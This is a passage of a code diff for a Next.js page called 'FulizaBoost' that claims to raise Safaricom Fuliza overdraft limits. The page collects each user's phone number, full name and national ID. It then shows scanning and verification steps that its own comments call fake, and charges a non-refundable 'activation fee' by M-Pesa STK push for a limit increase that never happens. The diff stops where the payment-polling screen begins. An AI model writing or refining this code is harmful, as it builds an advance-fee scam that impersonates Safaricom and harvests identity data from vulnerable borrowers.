@@ -1,505 +1,609 @@
 'use client';
 
-import React, { useState } from 'react';
-import Link from 'next/link';
+import React, { useState, useEffect, Suspense } from 'react';
 import { useRouter } from 'next/navigation';
+import Link from 'next/link';
 import { 
+  ArrowLeft, 
   Zap, 
-  ShieldCheck, 
   Smartphone, 
   CheckCircle2, 
-  ArrowLeft, 
   Loader2, 
-  AlertCircle,
-  ChevronDown,
+  Lock, 
+  User, 
+  CreditCard, 
+  ChevronRight, 
+  BadgeCheck, 
+  AlertCircle, 
+  ShieldCheck,
   TrendingUp,
-  Target,
-  BadgeCheck,
-  Lock,
-  Home,
-  Clock,
-  RotateCcw
+  XCircle,
+  RefreshCcw,
+  Info,
+  Server
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 
-// --- CONFIGURATION: LIMITS & FEES (2% Calculation) ---
+// --- CONFIGURATION ---
 const LIMIT_OPTIONS = [
-  { amount: 5000, fee: 100 },
-  { amount: 7500, fee: 150 },
-  { amount: 10000, fee: 200 },
-  { amount: 15000, fee: 300 },
-  { amount: 20000, fee: 400 },
-  { amount: 35000, fee: 700 },
-  { amount: 50000, fee: 1000 },
-  { amount: 70000, fee: 1400 },
-  { amount: 85000, fee: 1700 },
-  { amount: 100000, fee: 2000 },
+  { amount: 5000, fee: 100, label: 'Starter' },
+  { amount: 7500, fee: 150, label: 'Popular' },
+  { amount: 10000, fee: 200, label: 'Recommended' },
+  { amount: 15000, fee: 300, label: 'Business' },
+  { amount: 20000, fee: 400, label: 'Business+' },
+  { amount: 35000, fee: 700, label: 'Elite' },
+  { amount: 50000, fee: 1000, label: 'Pro' },
+  { amount: 70000, fee: 1400, label: 'Max' },
 ];
+
+// --- REUSABLE COMPONENTS (Matches Loan Page) ---
+
+const IconContainer = ({ children }: { children: React.ReactNode }) => (
+  <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
+    {children}
+  </div>
+);
+
+const CustomInput = ({
+  label,
+  icon: Icon,
+  type = "text",
+  value,
+  onChange,
+  placeholder
+}: any) => (
+  <div className="relative">
+      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
+      <div className="relative flex items-center h-14 w-full rounded-xl border border-slate-200 bg-white hover:border-blue-400 focus-within:border-blue-600 focus-within:ring-1 focus-within:ring-blue-600 transition-all">
+          <IconContainer>
+              <Icon className="w-5 h-5" />
+          </IconContainer>
+          <input 
+              type={type}
+              className="w-full h-full pl-16 pr-4 bg-transparent outline-none text-slate-900 font-bold text-sm placeholder:text-slate-400"
+              placeholder={placeholder}
+              value={value}
+              onChange={onChange}
+          />
+      </div>
+  </div>
+);
 
 export default function FulizaPage() {
   const router = useRouter();
-  const currentYear = new Date().getFullYear();
 
-  // Steps: 'grid' -> 'form' -> 'stk_push' -> 'result'
-  const [currentStep, setCurrentStep] = useState<'grid' | 'form' | 'stk_push' | 'result'>('grid');
-  const [resultStatus, setResultStatus] = useState<'approved' | 'soft_decline' | null>(null);
-  
-  // Data State
-  const [selectedOffer, setSelectedOffer] = useState({ amount: 0, fee: 0 });
-  const [formData, setFormData] = useState({ phone: '', idNumber: '', range: '' });
+  // Steps: verify -> details -> analyze -> offers -> summary -> stk_push -> success -> failed
+  const [step, setStep] = useState('verify');
+
+  // Data
+  const [phone, setPhone] = useState('');
+  const [details, setDetails] = useState({ fullName: '', idNumber: '' });
+  const [selectedOffer, setSelectedOffer] = useState<{amount: number, fee: number, label: string} | null>(null);
+  const [termsAccepted, setTermsAccepted] = useState(false);
+  const [trackingId] = useState(`FZ-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
+
+  // UI State
+  const [loadingText, setLoadingText] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
-  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
-  const [errors, setErrors] = useState({ phone: '', id: '' });
-
-  // Range options
-  const rangeOptions = [
-    { value: 'low', label: 'Ksh 1,000 - 10,000', description: 'Light User' },
-    { value: 'mid', label: 'Ksh 10,000 - 50,000', description: 'Regular User' },
-    { value: 'high', label: 'Ksh 50,000 - 150,000', description: 'Active User' },
-    { value: 'elite', label: 'Above Ksh 150,000', description: 'Power User' }
-  ];
+  const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
+  const [errorMsg, setErrorMsg] = useState('');
 
   // --- HANDLERS ---
-  const handleSelect = (offer: { amount: number, fee: number }) => {
-    setSelectedOffer(offer);
-    setCurrentStep('form');
-    setErrors({ phone: '', id: '' }); // Clear errors
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+
+  // 1. Phone Input (Strict)
+  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, '').slice(0, 10);
+    setPhone(val);
+    setErrorMsg('');
   };
 
-  const validateForm = () => {
-    let isValid = true;
-    const newErrors = { phone: '', id: '' };
-
-    // Validate Phone (Kenyan format: 07xx or 01xx + 8 digits = 10 digits total)
-    const phoneRegex = /^0(7|1)\d{8}$/;
-    if (!phoneRegex.test(formData.phone)) {
-        newErrors.phone = 'Enter a valid Safaricom number (e.g., 0712345678)';
-        isValid = false;
-    }
-
-    // Validate ID:
-    // 1. Must be 6 to 8 digits (\d{5,7} after the first digit)
-    // 2. Cannot start with 0 (^[1-9])
-    const idRegex = /^[1-9]\d{5,7}$/;
-    if (!idRegex.test(formData.idNumber)) {
-        newErrors.id = 'ID must be 6-8 digits and cannot start with 0';
-        isValid = false;
-    }
-
-    setErrors(newErrors);
-    return isValid;
-  };
-
-  const handleSubmit = (e: React.FormEvent) => {
+  // 2. Verify Phone
+  const handleVerify = (e: React.FormEvent) => {
     e.preventDefault();
-    
-    if (!validateForm()) return;
+    if (phone.length !== 10 || (!phone.startsWith('01') && !phone.startsWith('07'))) {
+        setErrorMsg('Enter a valid 10-digit Safaricom number');
+        return;
+    }
+    setErrorMsg('');
+    setIsProcessing(true);
 
+    // Fake connection sequence
+    const sequence = [
+        { t: 'Connecting to Safaricom Overdraft...', d: 1000 },
+        { t: 'Verifying Subscriber Status...', d: 1500 },
+        { t: 'Connection Established', d: 500 }
+    ];
+
+    let totalDelay = 0;
+    sequence.forEach(({ t, d }, i) => {
+        totalDelay += d;
+        setTimeout(() => {
+            setLoadingText(t);
+            if (i === sequence.length - 1) {
+                setTimeout(() => {
+                    setIsProcessing(false);
+                    setStep('details');
+                }, 500);
+            }
+        }, totalDelay);
+    });
+  };
+
+  // 3. Details & Analysis
+  const handleDetailsSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    // Validate
+    if (!details.fullName.trim() || details.idNumber.length < 6) {
+        setErrorMsg('Please enter valid Name and ID');
+        return;
+    }
+    setErrorMsg('');
+    setIsProcessing(true);
+
+    // Fake "Analysis" sequence
+    const sequence = [
+        { t: `Authenticating ${details.fullName.split(' ')[0]}...`, d: 1200 },
+        { t: 'Scanning M-Pesa Transaction History...', d: 2000 },
+        { t: 'Calculating Maximum Limit Cap...', d: 1500 },
+        { t: 'Optimizing Offer List...', d: 800 }
+    ];
+
+    let totalDelay = 0;
+    sequence.forEach(({ t, d }, i) => {
+        totalDelay += d;
+        setTimeout(() => {
+            setLoadingText(t);
+            if (i === sequence.length - 1) {
+                setTimeout(() => {
+                    setIsProcessing(false);
+                    setStep('offers');
+                }, 800);
+            }
+        }, totalDelay);
+    });
+  };
+
+  // 4. Select Offer
+  const handleSelectOffer = (offer: any) => {
+      setSelectedOffer(offer);
+      setStep('summary');
+      window.scrollTo(0,0);
+  };
+
+  // 5. Submit Payment
+  const handlePayment = async () => {
+    if (!selectedOffer || !termsAccepted) {
+        setErrorMsg('Please accept the terms to proceed.');
+        return;
+    }
     setIsProcessing(true);
     
-    // 1. Simulate API Call / Validation
-    setTimeout(() => {
+    try {
+        const res = await fetch('/api/stkpush', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                phoneNumber: phone,
+                idNumber: details.idNumber,
+                amount: selectedOffer.fee,
+                serviceType: 'FULIZA_BOOST'
+            })
+        });
+
+        const data = await res.json();
+        if (data.success) {
+            setIsProcessing(false);
+            setStep('stk_push');
+            startPolling(data.checkoutRequestID);
+        } else {
+            alert(data.error || 'Connection failed');
+            setIsProcessing(false);
+        }
+    } catch (err) {
         setIsProcessing(false);
-        setCurrentStep('stk_push');
-        
-        // 2. Simulate Payment Wait Time & Determine Outcome
-        setTimeout(() => {
-            // LOGIC: If amount > 5000, Soft Decline. Else, Success.
-            if (selectedOffer.amount > 5000) {
-                setResultStatus('soft_decline');
+        alert('Network Error');
+    }
+  };
+
+  const startPolling = (reqId: string) => {
+    let attempts = 0;
+    const interval = setInterval(async () => {
+        attempts++;
+        try {
+            const res = await fetch(`/api/check-status?id=${reqId}`);
+            const data = await res.json();
+            if (data.status === 'COMPLETED') {
+                clearInterval(interval);
+                // Fake "Syncing" Animation before success
+                setStep('syncing');
+                setTimeout(() => setStep('success'), 3000);
+            } else if (data.status === 'FAILED') {
+                clearInterval(interval);
+                setStep('failed');
             } else {
-                setResultStatus('approved');
+                setPollMessage(attempts % 2 === 0 ? 'Waiting for PIN...' : 'Processing...');
             }
-            setCurrentStep('result');
-        }, 5000); // 5 seconds wait for STK
-    }, 1500);
+            if (attempts > 60) {
+                clearInterval(interval);
+                setStep('failed');
+            }
+        } catch(e) {}
+    }, 2000);
   };
 
   return (
-    <div className="min-h-screen bg-white font-sans text-slate-900 selection:bg-indigo-100 selection:text-indigo-900">
+    <div className="min-h-screen bg-slate-50/50 font-sans text-slate-900">
       
-      {/* --- Status Bar --- */}
-      <div className="bg-indigo-950 text-white text-xs py-2 px-3 relative z-50">
-        <div className="flex justify-between items-center max-w-7xl mx-auto">
-          <div className="flex items-center gap-2">
-            <span className="relative flex h-2 w-2">
-              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-              <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
-            </span>
-            <span className="font-bold tracking-wide text-indigo-100">SYSTEM ACTIVE</span>
-          </div>
-          <div className="flex items-center gap-2 text-[10px] font-medium bg-white/10 px-2 py-1 rounded-full">
-            <ShieldCheck className="h-3 w-3 text-emerald-400" />
-            <span className="text-white">SECURE SESSION</span>
-          </div>
+      {/* --- STATUS BAR --- */}
+      <div className="bg-slate-900 text-white text-[10px] font-bold py-2 px-3 relative z-50">
+        <div className="max-w-md mx-auto flex justify-between items-center">
+            <div className="flex items-center gap-2">
+                <div className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse"></div>
+                <span className="tracking-wide opacity-90">SYSTEM ONLINE</span>
+            </div>
+            <div className="flex items-center gap-1 opacity-75">
+                <ShieldCheck className="w-3 h-3" />
+                <span>Encrypted</span>
+            </div>
         </div>
       </div>
 
-      {/* --- Header --- */}
-      <header className="sticky top-0 z-40 w-full bg-white/95 backdrop-blur-md border-b border-slate-100">
-        <div className="container mx-auto px-4 lg:px-8">
-          <div className="flex h-16 md:h-20 items-center justify-between">
+      {/* --- HEADER --- */}
+      <header className="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-slate-100">
+        <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
             <div className="flex items-center gap-3">
-              {/* Navigation Logic */}
-              {currentStep !== 'grid' ? (
-                <button 
-                  onClick={() => setCurrentStep('grid')}
-                  className="h-10 w-10 bg-slate-100 hover:bg-slate-200 rounded-xl flex items-center justify-center transition-colors"
-                >
-                    <ArrowLeft className="w-5 h-5 text-slate-700"/>
+              {step !== 'verify' && step !== 'success' ? (
+                <button onClick={() => setStep('verify')} className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center">
+                    <ArrowLeft className="w-4 h-4 text-slate-600"/>
                 </button>
               ) : (
-                <Link href="/" className="h-10 w-10 bg-slate-100 hover:bg-slate-200 rounded-xl flex items-center justify-center transition-colors">
-                    <Home className="w-5 h-5 text-slate-700"/>
+                <Link href="/" className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center">
+                    <ArrowLeft className="w-4 h-4 text-slate-600"/>
                 </Link>
               )}
-              
-              <div className="leading-tight">
-                <span className="text-xl font-black tracking-tight text-slate-900 block">
-                  FulizaBoost
-                </span>
-              </div>
+              <span className="font-black text-slate-900 tracking-tight text-lg">FulizaBoost</span>
             </div>
-            
-            <div className="hidden sm:flex items-center gap-2 px-3 py-1 bg-blue-50 text-blue-700 rounded-lg text-xs font-bold uppercase tracking-wider">
-               <Zap className="h-3 w-3 fill-current" /> Official Service
+            <div className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-[10px] font-bold uppercase tracking-wide flex items-center gap-1">
+               <Zap className="w-3 h-3 fill-current" /> Auto
             </div>
-          </div>
         </div>
       </header>
 
       {/* --- MAIN CONTENT --- */}
-      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-8 md:py-12">
-        
-        {/* Progress Dots */}
-        <div className="flex justify-center mb-10">
-            <div className="flex gap-3">
-                {['grid', 'form', 'stk_push', 'result'].map((step, i) => {
-                    const steps = ['grid', 'form', 'stk_push', 'result'];
-                    const currentIndex = steps.indexOf(currentStep);
-                    const isActive = i <= currentIndex;
-                    
-                    return (
-                        <div key={step} className={`h-1.5 rounded-full transition-all duration-500 ${isActive ? 'w-8 bg-blue-600' : 'w-2 bg-slate-200'}`} />
-                    )
-                })}
-            </div>
-        </div>
+      <main className="max-w-md mx-auto px-4 py-8 pb-24">
 
-        {/* ==========================================
-            VIEW 1: LIMIT SELECTION GRID
-           ========================================== */}
-        {currentStep === 'grid' && (
-            <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
-                <div className="text-center mb-10 max-w-2xl mx-auto">
-                  <h1 className="text-3xl md:text-5xl font-black text-slate-900 mb-4">
-                    Choose Your <span className="text-blue-600">New Limit</span>
-                  </h1>
-                  <p className="text-lg text-slate-500 font-medium">
-                    Limits approved instantly based on history.
-                  </p>
+        {/* STEP 1: VERIFY */}
+        {step === 'verify' && (
+             <div className="animate-in slide-in-from-bottom-4 duration-500">
+                <div className="text-center mb-8">
+                    <h1 className="text-2xl font-black text-slate-900 mb-2">Check Limit</h1>
+                    <p className="text-sm text-slate-500 font-medium">Enter M-Pesa number to scan for increases.</p>
+                </div>
+                
+                <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100 p-6">
+                    {!isProcessing ? (
+                        <form onSubmit={handleVerify} className="space-y-6">
+                             <CustomInput 
+                                label="Phone Number"
+                                icon={Smartphone}
+                                type="tel"
+                                placeholder="0712345678"
+                                value={phone}
+                                onChange={handlePhoneInput}
+                            />
+                            {errorMsg && (
+                                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
+                                    <AlertCircle className="w-4 h-4" /> {errorMsg}
+                                </div>
+                            )}
+                            <Button className="w-full h-14 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl text-base shadow-lg transition-transform hover:-translate-y-0.5">
+                                Scan Now
+                            </Button>
+                            <div className="flex items-center justify-center gap-2 text-xs text-slate-400 font-bold pt-2">
+                                <Lock className="w-3 h-3" /> Secure Verification
+                            </div>
+                        </form>
+                    ) : (
+                        <div className="py-12 text-center space-y-6">
+                            <Loader2 className="w-12 h-12 text-blue-600 animate-spin mx-auto" />
+                            <p className="text-sm font-bold text-slate-700 animate-pulse">{loadingText}</p>
+                        </div>
+                    )}
+                </div>
+             </div>
+        )}
+
+        {/* STEP 2: DETAILS */}
+        {step === 'details' && (
+             <div className="animate-in slide-in-from-right duration-500">
+                 <div className="bg-white rounded-xl shadow-xl shadow-slate-100 border border-slate-100 overflow-hidden">
+                     <div className="bg-blue-50/50 p-5 border-b border-blue-50 flex items-center justify-between rounded-t-xl">
+                        <div>
+                            <h2 className="text-xs font-bold text-blue-800 uppercase tracking-wide">Subscriber Found</h2>
+                            <p className="text-sm font-black text-slate-900 mt-0.5">{phone}</p>
+                        </div>
+                        <BadgeCheck className="w-6 h-6 text-blue-500" />
+                    </div>
+
+                    {!isProcessing ? (
+                        <form onSubmit={handleDetailsSubmit} className="p-6 space-y-5">
+                            <div className="text-center mb-2">
+                                <p className="text-sm text-slate-500 font-medium">Verify your identity to unlock limits.</p>
+                            </div>
+
+                            <CustomInput 
+                                label="Full Name"
+                                icon={User}
+                                placeholder="e.g. John Doe"
+                                value={details.fullName}
+                                onChange={(e: any) => setDetails({...details, fullName: e.target.value})}
+                            />
+
+                            <CustomInput 
+                                label="ID Number"
+                                icon={CreditCard}
+                                type="tel"
+                                placeholder="e.g. 12345678"
+                                value={details.idNumber}
+                                onChange={(e: any) => {
+                                    const val = e.target.value.replace(/\D/g, '').slice(0, 8);
+                                    setDetails({...details, idNumber: val})
+                                }}
+                            />
+
+                            {errorMsg && (
+                                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
+                                    <AlertCircle className="w-4 h-4" /> {errorMsg}
+                                </div>
+                            )}
+
+                            <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg mt-2">
+                                Analyze & Unlock <ChevronRight className="w-4 h-4 ml-2" />
+                            </Button>
+                        </form>
+                    ) : (
+                        <div className="p-10 text-center space-y-6">
+                            <div className="relative w-16 h-16 mx-auto">
+                                <div className="absolute inset-0 border-4 border-slate-50 rounded-full"></div>
+                                <div className="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                            </div>
+                            <p className="text-sm font-bold text-slate-700 animate-pulse leading-relaxed px-4">{loadingText}</p>
+                        </div>
+                    )}
+                 </div>
+             </div>
+        )}
+
+        {/* STEP 3: OFFERS (GRID) */}
+        {step === 'offers' && (
+            <div className="animate-in zoom-in-95 duration-500">
+                <div className="text-center mb-6">
+                    <h2 className="text-xl font-black text-slate-900">Hello {details.fullName.split(' ')[0]}!</h2>
+                    <p className="text-sm text-slate-500 font-medium">You qualify for the following limits.</p>
                 </div>
 
-                <div className="grid grid-cols-2 lg:grid-cols-4 xl:grid-cols-5 gap-4 md:gap-6">
+                <div className="grid grid-cols-2 gap-3">
                     {LIMIT_OPTIONS.map((opt) => (
                         <button 
                             key={opt.amount}
-                            onClick={() => handleSelect(opt)}
-                            className="group relative bg-white rounded-3xl p-5 text-left transition-all duration-300 hover:-translate-y-1 border-2 border-transparent shadow-lg shadow-slate-200/50 hover:border-blue-200 hover:shadow-xl"
+                            onClick={() => handleSelectOffer(opt)}
+                            className="group relative bg-white p-4 rounded-xl border border-slate-200 hover:border-blue-500 hover:shadow-lg transition-all text-left overflow-hidden"
                         >
-                            <div className="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-2">Limit</div>
-                            
-                            <div className="flex flex-col items-start mb-4">
-                              <span className="text-xs font-bold text-slate-500">KES</span>
-                              <span className="text-2xl sm:text-3xl font-black text-slate-900 tracking-tight">
-                                {opt.amount.toLocaleString()}
-                              </span>
-                            </div>
-                            
-                            <div className="w-full py-1.5 bg-blue-50 rounded-lg text-center">
-                                <span className="text-xs font-bold text-blue-700">Fee: KES {opt.fee}</span>
+                            {opt.label === 'Recommended' && (
+                                <div className="absolute top-0 right-0 bg-blue-500 text-white text-[9px] font-bold px-2 py-0.5 rounded-bl-lg">
+                                    BEST
+                                </div>
+                            )}
+                            <div className="text-[10px] font-bold text-slate-400 uppercase mb-1">{opt.label}</div>
+                            <div className="text-lg font-black text-slate-900 mb-2">KES {opt.amount.toLocaleString()}</div>
+                            <div className="inline-block bg-slate-50 text-slate-600 text-[10px] font-bold px-2 py-1 rounded group-hover:bg-blue-50 group-hover:text-blue-700">
+                                Fee: {opt.fee}
                             </div>
                         </button>
                     ))}
                 </div>
-                
-                {/* Benefits Section */}
-                <div className="mt-12 bg-slate-50 rounded-3xl p-6 md:p-8 border border-slate-100">
-                  <div className="grid md:grid-cols-3 gap-6">
-                    {[
-                        { title: 'Instant Activation', icon: <Zap className="w-5 h-5"/>, desc: 'Zero waiting period.' },
-                        { title: 'Higher Limits', icon: <TrendingUp className="w-5 h-5"/>, desc: 'Access up to 150k.' },
-                        { title: 'Priority Support', icon: <ShieldCheck className="w-5 h-5"/>, desc: '24/7 dedicated line.' }
-                    ].map((benefit, i) => (
-                        <div key={i} className="flex items-center gap-4">
-                            <div className="h-10 w-10 rounded-xl bg-white shadow-sm flex items-center justify-center text-blue-600">
-                                {benefit.icon}
-                            </div>
-                            <div>
-                                <h3 className="font-bold text-slate-900 text-sm">{benefit.title}</h3>
-                                <p className="text-xs text-slate-500">{benefit.desc}</p>
-                            </div>
-                        </div>
-                    ))}
-                  </div>
-                </div>
             </div>
         )}
 
-        {/* ==========================================
-            VIEW 2: FORM
-           ========================================== */}
-        {currentStep === 'form' && (
-            <div className="max-w-md mx-auto animate-in fade-in slide-in-from-bottom-8 duration-500">
-                <div className="bg-white rounded-[2rem] shadow-2xl shadow-slate-200/60 border border-slate-100 overflow-visible relative z-10">
-                    
-                    {/* Ticket Header */}
-                    <div className="p-8 bg-blue-600 text-white relative overflow-hidden rounded-t-[2rem]">
-                        <div className="absolute top-0 right-0 w-32 h-32 bg-white opacity-10 rounded-full -translate-y-1/2 translate-x-1/2 blur-2xl"></div>
-                        <div className="relative z-10">
-                            <span className="text-blue-200 font-bold text-xs uppercase tracking-widest">Selected Package</span>
-                            <div className="flex items-baseline gap-1 mt-2">
-                                <span className="text-2xl font-medium text-blue-200">KES</span>
-                                <span className="text-5xl font-black">{selectedOffer.amount.toLocaleString()}</span>
-                            </div>
-                            <div className="mt-4 flex items-center gap-2 text-sm font-medium text-blue-100 bg-blue-700/50 p-2 rounded-lg w-fit px-4">
-                                <BadgeCheck className="w-4 h-4"/>
-                                Fee: KES {selectedOffer.fee}
-                            </div>
-                        </div>
+        {/* STEP 4: SUMMARY */}
+        {step === 'summary' && selectedOffer && (
+            <div className="animate-in slide-in-from-bottom-4 duration-500">
+                 <div className="bg-white rounded-xl shadow-xl border border-slate-100 overflow-hidden">
+                    <div className="bg-slate-900 p-6 text-white text-center">
+                        <h2 className="text-lg font-bold">Confirm Boost</h2>
+                        <p className="text-slate-400 text-xs mt-1">Final step to activate your limit.</p>
                     </div>
 
-                    <form onSubmit={handleSubmit} className="p-8 space-y-5">
-                        {/* Phone */}
-                        <div className="space-y-2">
-                            <label className="text-xs font-bold text-slate-900 uppercase tracking-wide">M-Pesa Number</label>
-                            <input 
-                                type="tel" 
-                                placeholder="0712 345 678"
-                                maxLength={10}
-                                className={`w-full h-14 pl-4 pr-4 bg-slate-50 border-2 rounded-xl outline-none font-bold text-lg text-slate-900 transition-all placeholder:text-slate-300 ${errors.phone ? 'border-red-500 focus:border-red-500' : 'border-transparent focus:border-blue-500 focus:bg-white'}`}
-                                value={formData.phone}
-                                onChange={e => setFormData({...formData, phone: e.target.value})}
-                            />
-                            {errors.phone && <p className="text-xs text-red-500 font-bold">{errors.phone}</p>}
-                        </div>
-
-                        {/* ID */}
-                        <div className="space-y-2">
-                            <label className="text-xs font-bold text-slate-900 uppercase tracking-wide">ID Number</label>
-                            <input 
-                                type="number" 
-                                placeholder="12345678"
-                                maxLength={8}
-                                className={`w-full h-14 pl-4 pr-4 bg-slate-50 border-2 rounded-xl outline-none font-bold text-lg text-slate-900 transition-all placeholder:text-slate-300 ${errors.id ? 'border-red-500 focus:border-red-500' : 'border-transparent focus:border-blue-500 focus:bg-white'}`}
-                                value={formData.idNumber}
-                                onChange={e => setFormData({...formData, idNumber: e.target.value})}
-                            />
-                             {errors.id && <p className="text-xs text-red-500 font-bold">{errors.id}</p>}
-                        </div>
-
-                        {/* Range - Custom Dropdown with Fix */}
-                        <div className="space-y-2 relative">
-                            <label className="text-xs font-bold text-slate-900 uppercase tracking-wide">Avg. Monthly Usage</label>
-                            <div className="relative">
-                                <button
-                                    type="button"
-                                    onClick={() => setIsDropdownOpen(!isDropdownOpen)}
-                                    className="w-full h-14 px-4 rounded-xl bg-slate-50 border-2 border-transparent hover:border-blue-200 focus:border-blue-500 flex items-center justify-between text-left transition-all group"
-                                >
-                                    <div className="flex items-center gap-3">
-                                      <div className={`h-8 w-8 rounded-full flex items-center justify-center ${formData.range ? 'bg-blue-600 text-white' : 'bg-slate-200 text-slate-400'}`}>
-                                        <Target className="w-4 h-4" />
-                                      </div>
-                                      <span className={`font-bold text-sm ${formData.range ? 'text-slate-900' : 'text-slate-400'}`}>
-                                        {formData.range ? rangeOptions.find(opt => opt.value === formData.range)?.label : 'Select range...'}
-                                      </span>
-                                    </div>
-                                    <ChevronDown className={`w-4 h-4 text-slate-400 transition-transform ${isDropdownOpen ? 'rotate-180' : ''}`} />
-                                </button>
-                                
-                                {isDropdownOpen && (
-                                    <div className="absolute top-full mt-2 w-full bg-white border border-slate-100 rounded-xl shadow-2xl z-50 max-h-[250px] overflow-y-auto p-1">
-                                        {rangeOptions.map((option) => (
-                                            <button
-                                                key={option.value}
-                                                type="button"
-                                                onClick={() => {
-                                                    setFormData({...formData, range: option.value})
-                                                    setIsDropdownOpen(false)
-                                                }}
-                                                className="w-full p-3 text-left hover:bg-blue-50 rounded-lg transition-colors flex items-center justify-between border-b border-slate-50 last:border-0"
-                                            >
-                                                <div>
-                                                    <div className="font-bold text-slate-900 text-sm">{option.label}</div>
-                                                </div>
-                                                {formData.range === option.value && (
-                                                    <CheckCircle2 className="w-4 h-4 text-blue-600" />
-                                                )}
-                                            </button>
-                                        ))}
-                                    </div>
-                                )}
+                    <div className="p-6">
+                         <div className="space-y-4 border-b border-slate-100 pb-6 mb-6">
+                             <div className="flex justify-between items-center">
+                                <span className="text-slate-500 text-sm font-bold uppercase">Subscriber</span>
+                                <span className="text-slate-900 font-bold text-sm">{details.fullName}</span>
                             </div>
-                        </div>
+                             <div className="flex justify-between items-center">
+                                <span className="text-slate-500 text-sm font-bold uppercase">Phone</span>
+                                <span className="text-slate-900 font-bold text-sm">{phone}</span>
+                            </div>
+                            <div className="h-px bg-slate-50 my-2"></div>
+                            <div className="flex justify-between items-center">
+                                <span className="text-slate-900 font-bold">New Limit</span>
+                                <span className="text-2xl font-black text-blue-600">KES {selectedOffer.amount.toLocaleString()}</span>
+                            </div>
+                            
+                            <div className="bg-blue-50/80 p-4 rounded-xl border border-blue-100 space-y-2">
+                                <div className="flex justify-between items-center">
+                                    <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Activation Fee</span>
+                                    <span className="text-blue-900 font-black text-lg">KES {selectedOffer.fee}</span>
+                                </div>
+                                <div className="flex gap-2 items-start">
+                                    <Info className="w-3 h-3 text-blue-600 mt-0.5 shrink-0" />
+                                    <p className="text-[10px] text-blue-700 font-medium leading-tight">
+                                        <span className="font-bold">Non-refundable.</span> Covers scoring & profile update fees.
+                                    </p>
+                                </div>
+                            </div>
+                         </div>
 
-                        {/* Action Button */}
+                         <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 flex gap-3 items-start mb-6">
+                            <div className="pt-0.5">
+                                <input 
+                                    type="checkbox" 
+                                    id="terms"
+                                    checked={termsAccepted}
+                                    onChange={(e) => setTermsAccepted(e.target.checked)}
+                                    className="w-5 h-5 rounded border-slate-300 text-blue-600 focus:ring-blue-500 cursor-pointer"
+                                />
+                            </div>
+                            <label htmlFor="terms" className="text-xs text-slate-500 font-medium leading-relaxed cursor-pointer">
+                                I confirm the details above and understand the fee is for limit assessment and is non-refundable.
+                            </label>
+                        </div>
+                        
+                        {errorMsg && (
+                            <div className="mb-4 text-center text-red-600 text-xs font-bold">
+                                {errorMsg}
+                            </div>
+                        )}
+
                         <Button 
-                            type="submit"
+                            onClick={handlePayment}
                             disabled={isProcessing}
-                            className={`w-full h-14 bg-emerald-500 hover:bg-emerald-400 text-white font-black text-lg rounded-xl shadow-xl shadow-emerald-500/20 transition-all hover:-translate-y-1 mt-2
-                              ${isProcessing ? 'opacity-80' : ''}`}
+                            className="w-full h-16 bg-blue-600 hover:bg-blue-500 text-white font-black text-lg rounded-xl shadow-xl shadow-blue-600/20 transition-transform hover:-translate-y-0.5"
                         >
-                            {isProcessing ? (
+                             {isProcessing ? (
                                 <div className="flex items-center gap-2">
                                     <Loader2 className="w-5 h-5 animate-spin" />
-                                    <span>Initiating...</span>
+                                    <span>Processing...</span>
                                 </div>
                             ) : (
-                                <span>Pay KES {selectedOffer.fee} & Activate</span>
+                                <span>Pay KES {selectedOffer.fee}</span>
                             )}
                         </Button>
                         
-                        <div className="text-center">
-                            <p className="text-[10px] font-bold text-slate-400 uppercase tracking-wide flex items-center justify-center gap-1">
-                                <Lock className="w-3 h-3"/> Bank-Grade Security
-                            </p>
-                        </div>
-                    </form>
-                </div>
+                        <button 
+                            onClick={() => setStep('offers')} 
+                            className="w-full text-center mt-6 text-xs font-bold text-slate-400 hover:text-slate-600"
+                        >
+                            Select Different Limit
+                        </button>
+                    </div>
+                 </div>
             </div>
         )}
 
-        {/* ==========================================
-            VIEW 3: STK PUSH
-           ========================================== */}
-        {currentStep === 'stk_push' && (
-            <div className="max-w-md mx-auto pt-8 animate-in zoom-in-95 duration-500">
-                <div className="bg-white p-8 rounded-[2.5rem] shadow-2xl shadow-emerald-100 border border-slate-50 text-center relative overflow-hidden">
-                    <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-emerald-400 to-emerald-600"></div>
-                    
-                    <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6 relative">
-                        <div className="absolute inset-0 animate-ping bg-emerald-400 rounded-full opacity-20"></div>
-                        <Smartphone className="w-10 h-10 text-emerald-600" />
+        {/* STEP 5: POLLING */}
+        {step === 'stk_push' && selectedOffer && (
+             <div className="animate-in zoom-in-95 duration-500 pt-10 text-center">
